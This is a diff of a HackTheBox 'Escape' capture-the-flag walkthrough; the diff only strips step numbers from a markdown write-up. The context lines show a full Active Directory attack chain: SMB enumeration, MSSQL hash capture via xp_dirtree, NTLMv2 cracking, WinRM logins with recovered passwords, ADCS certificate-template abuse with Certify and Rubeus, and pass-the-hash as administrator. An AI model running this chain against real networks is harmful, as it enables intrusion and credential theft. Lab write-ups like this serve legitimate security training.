@@ -18,7 +18,7 @@ published: true
 
 ## Initial foothold
 
-1. Let's start with a port-scan:
+Let's start with a port-scan:
 
   ```shell
   # port scanning with nmap
@@ -94,11 +94,11 @@ published: true
   Aggressive OS guesses: Microsoft Windows Server 2019 (89%)
   ```
 
-2. From Nmap's output, we can see a domain name: `sequel.htb0`, as well as an alternative name: `dc.sequel.htb`. So let's add those into our `/etc/hosts` file:
+From Nmap's output, we can see a domain name: `sequel.htb0`, as well as an alternative name: `dc.sequel.htb`. So let's add those into our `/etc/hosts` file:
 
   ![](domain_names_hosts.png)
 
-3. There is an SMB server on port 445 listening, so we could try enumerating that using `crackmapexec`:
+There is an SMB server on port 445 listening, so we could try enumerating that using `crackmapexec`:
 
   ```shell
   # enumerating shares and permissions with crackmapexec
@@ -118,7 +118,7 @@ published: true
   
   > We must pass a random username for the above command to work.
 
-4. Since we have `READ` permissions on the `Public` share we can connect to it and see what's inside:
+Since we have `READ` permissions on the `Public` share we can connect to it and see what's inside:
 
   ```shell
   # connecting the to Public share
@@ -135,7 +135,7 @@ published: true
   getting file \SQL Server Procedures.pdf of size 49551 as SQL Server Procedures.pdf (348.1 KiloBytes/sec) (average 348.1 KiloBytes/sec)
   ```
 
-5. The PDF file contains instructions on how to connect to the SQL server:
+The PDF file contains instructions on how to connect to the SQL server:
 
   ```shell
   # opening the PDF file
@@ -144,7 +144,7 @@ published: true
 
   ![](pdf_content.png)
 
-6. We can first check if we can login with the provided creds using local authentication (PDF referred to as *SQL Server Authentication*):
+We can first check if we can login with the provided creds using local authentication (PDF referred to as *SQL Server Authentication*):
 
   ```shell
   # checking mssql creds
@@ -195,7 +195,7 @@ published: true
 
 ## Lateral privilege escalation
 
-7. We can try capturing the MSSQL service hash using `xp_subdirs` or `xp_dirtree`.
+We can try capturing the MSSQL service hash using `xp_subdirs` or `xp_dirtree`.
 
   > The below process is demonstrating in the following module: Attacking Commong Services - [Attacking SQL Databases](https://academy.hackthebox.com/module/116/section/1169).
 
@@ -259,7 +259,7 @@ published: true
   [SMB] NTLMv2-SSP Hash     : sql_svc::sequel:5a468d462566c8f2:969AC4350349119AFF80E5F157947705:010100000000000000F49497CB3CDA0171C9C617170C770A0000000002000800550036003900430001001E00570049004E002D004B00460044005400350054004B0031004C004200420004003400570049004E002D004B00460044005400350054004B0031004C00420042002E0055003600390043002E004C004F00430041004C000300140055003600390043002E004C004F00430041004C000500140055003600390043002E004C004F00430041004C000700080000F49497CB3CDA010600040002000000080030003000000000000000000000000030000053D56BD90CEC18B19DACD970F3D395DA99593D1D611EFCDEEDC06434B9D0792A0A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E0036000000000000000000
   ```
 
-8. Now we can attempt to crack the obtained NTLMv2 hash:
+Now we can attempt to crack the obtained NTLMv2 hash:
 
   ```shell
   # copy hash into a text file
@@ -301,7 +301,7 @@ published: true
   Stopped: Mon Jan  1 16:08:50 2024
   ```
 
-9. We can now try the creds `sql_svc:REGGIE1234ronnie` to check if they can be used to any listening service, such as WinRM:
+We can now try the creds `sql_svc:REGGIE1234ronnie` to check if they can be used to any listening service, such as WinRM:
 
   ```shell
   # checking current creds on WinRM
@@ -313,7 +313,7 @@ published: true
 
 ## Lateral privilege escalation 2
 
-10. Since that worked, let's log into WinRM and see what we can find. We will use [SharpCollection](https://github.com/Flangvik/SharpCollection)'s `Certify.exe` since we know that this machine is a certified authority to check for vulnerable cert templates. 
+Since that worked, let's log into WinRM and see what we can find. We will use [SharpCollection](https://github.com/Flangvik/SharpCollection)'s `Certify.exe` since we know that this machine is a certified authority to check for vulnerable cert templates. 
 
   We first need to transfer the executable into the target. We can do that by directly uploading using WinRM:
 
@@ -403,7 +403,7 @@ published: true
   Certify completed in 00:00:09.7859873
   ```
 
-11. It seems that we did not get much information from using `certify` as it found no vulnerable certificate templates. We can continue by enumerating the machine for further exploitation avenues:
+It seems that we did not get much information from using `certify` as it found no vulnerable certificate templates. We can continue by enumerating the machine for further exploitation avenues:
 
   ```shell
   # enumerating the machine
@@ -459,7 +459,7 @@ published: true
   <SNIP>
   ```
 
-11. Based on the log info we can deduce the following:
+Based on the log info we can deduce the following:
   1. The user `ryan.cooper` tried to login with the wrong password.
   2. Then he probably thought that his username was saved, thus, he typed directly his password.
   
@@ -473,7 +473,7 @@ published: true
   WINRM       escape          5985   DC               [+] sequel.htb\ryan.cooper:NuclearMosquito3 (Pwn3d!)
   ```
 
-12. Let's login as `ryan.cooper` and try to repeat the process using `certify.exe` now:
+Let's login as `ryan.cooper` and try to repeat the process using `certify.exe` now:
 
   ```shell
   # loggin in WinRM with the newly obtained creds
@@ -552,7 +552,7 @@ published: true
 
 ## Vertical privilege escalation
 
-13. We can now visit the [Certify's GitHub page](https://github.com/GhostPack/Certify) which includes details instructions on what we can do when we find a vulnerable cert template. There are 3 potential scenarios listed on this page, and we currently are on the third one (*VulnTemplate*). Luckily for us, they show the abuse of scenario 3 step by step:
+We can now visit the [Certify's GitHub page](https://github.com/GhostPack/Certify) which includes details instructions on what we can do when we find a vulnerable cert template. There are 3 potential scenarios listed on this page, and we currently are on the third one (*VulnTemplate*). Luckily for us, they show the abuse of scenario 3 step by step:
 
   ![](certify_github.png)
 
@@ -662,7 +662,7 @@ published: true
   $ openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
   ```
 
-15. Let's transfer [`rubeus.exe`](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Rubeus.exe) and our converted pfx file (`cert.pfx`) over to our target the same way as we did with `certify.exe`:
+Let's transfer [`rubeus.exe`](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Rubeus.exe) and our converted pfx file (`cert.pfx`) over to our target the same way as we did with `certify.exe`:
 
   ```shell
   # copy executable to the directory from where we logged in using WinRM
@@ -775,7 +775,7 @@ published: true
         NTLM              : A52F78E4C751E5F5E17E1E9F3E58F4EE
   ```
 
-16. We can use the NTLM hash to log into SMB as `administrator`:
+We can use the NTLM hash to log into SMB as `administrator`:
 
   ```shell
   $ crackmapexec smb escape -u administrator -H A52F78E4C751E5F5E17E1E9F3E58F4EE
